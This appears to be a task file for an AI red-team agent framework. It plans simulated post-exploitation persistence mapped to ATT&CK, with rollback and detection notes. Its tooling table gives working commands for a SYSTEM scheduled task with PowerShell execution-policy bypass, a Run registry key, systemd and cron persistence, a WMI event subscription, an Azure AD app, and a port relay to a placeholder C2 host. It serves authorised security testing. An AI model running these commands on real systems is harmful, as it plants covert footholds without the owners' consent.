<!-- Powered by BMAD(R) Core -->

# Task: installation-phase

## Purpose
- Plan simulated persistence mechanisms that maintain footholds while respecting ROE and defensive expectations.
- Produce docs/red-team/persistence-plan.md with technique catalog, dwell-time analysis, detection coverage, and rollback steps.

## Prerequisites
- docs/red-team/exploit-report.md
- Access to lab hosts or simulation environment reflecting target OS/platforms.
- Directories: scripts/persistence, reports/persistence.

## Success Criteria
- Persistence options mapped to ATT&CK techniques (e.g., T1053 Scheduled Task, T1547 Registry Run Keys, T1543 Systemd Service, T1098 Account Manipulation).
- Each option includes prerequisites, installation commands, detection artefacts (logs, registry keys, services), and safe removal instructions.
- Risk ratings (impact, dwell time, noise) documented alongside defender mitigation notes.
- Handoff to C2 Agent lists established footholds and communication expectations.

## Safety & Compliance
- Default to simulation unless live persistence is approved; never deploy on production systems without authorisation.
- Provide clear rollback scripts/commands and ensure they are tested in the same environment.
- Avoid credential or token leakage in documentation; tokenise sensitive data.

## Recommended Tooling
| Tool | Command | Goal | Expected Output |
| --- | --- | --- | --- |
| schtasks | `schtasks /Create /RU SYSTEM /SC ONLOGON /TN "Updater" /TR "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\updater.ps1"` | Model Windows scheduled task persistence. | Success message confirming task creation. |
| reg add | `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File %APPDATA%\\updater.ps1" /f` | Simulate Run key persistence. | Registry modification success message. |
| netsh portproxy | `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress={{c2_host}}` | Establish TCP relay for covert C2 persistence. | Confirmation of port proxy entry. |
| systemd service | `sudo tee /etc/systemd/system/rt-sync.service <<'EOF'
[Unit]
Description=Red Team Simulated Sync

[Service]
ExecStart=/usr/bin/python3 /opt/rt/sync.py
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF` | Document Linux systemd service persistence. | File creation confirmation; follow with `systemctl enable --now`. |
| crontab | `(crontab -l 2>/dev/null; echo "*/30 * * * * /usr/bin/python3 /opt/rt/sync.py >> /var/log/rt-sync.log 2>&1") | crontab -` | Simulate cron-based persistence. | Crontab updated (no output). |
| wmiexec | `wmic /namespace:\\root\\subscription PATH __EventFilter CREATE Name='RTLogon', EventNamespace='Root\\Cimv2', Query=""SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'""` | Demonstrate WMI event subscription persistence. | WMI object creation confirmation. |
| az cli | `az ad app create --display-name "Contoso Sync Agent" --credential-description "RedTeamSim"` | Plan cloud persistence through Azure AD application. | JSON response with appId/objectId (store securely). |

## Procedure
1. Review exploit-report.md and confirm available footholds, credentials, and platform coverage.
2. Establish persistence requirements: dwell-time expectations, resilience, stealth vs. reliability, mandated kill-switch conditions.
3. Select candidate techniques across operating systems, cloud, and identity planes. Note prerequisites (privileges, binaries, registry access).
4. For each technique:
   - Draft commands/scripts to establish persistence (schtasks, systemd, WMIC, az CLI, etc.).
   - Capture expected artefacts (registry paths, service names, cron entries, cloud audit logs).
   - Define monitoring and detection (e.g., Sysmon Event IDs 4698/4699, Azure AD audit logs, Linux journal entries).
   - Provide rollback commands and verification steps (e.g., schtasks /Delete, systemctl disable, az ad app delete).
5. Assess risk: rank each option for impact, noise, operational complexity, and defender visibility. Maintain scorecard in reports/persistence.
6. Document alternative or layered persistence (e.g., primary scheduled task plus cloud identity backup) with caution on redundancy vs. detection risk.
7. Populate docs/red-team/persistence-plan.md via template sections (Summary, Inputs, Technique Catalog, Detections, Mitigations, Handoff).
8. Store scripts under scripts/persistence with clear headers noting simulation status and removal instructions.
9. Prepare handoff brief for C2 Agent including active footholds, communication prerequisites, and monitoring notes.

## Decision Gates
- **Privilege Check**: confirm required privileges exist; if not, coordinate with Exploitation Agent for escalation or alternative technique.
- **Resilience vs. Stealth**: choose technique aligned with mission priorities; document reasoning.
- **Cloud Governance**: ensure cloud persistence actions comply with tenant policies; escalate if restrictions apply.

## Outputs
- `docs/red-team/persistence-plan.md`
- Supporting artefacts in `reports/persistence/` and scripts in `scripts/persistence/`
- Handoff summary for C2 phase.
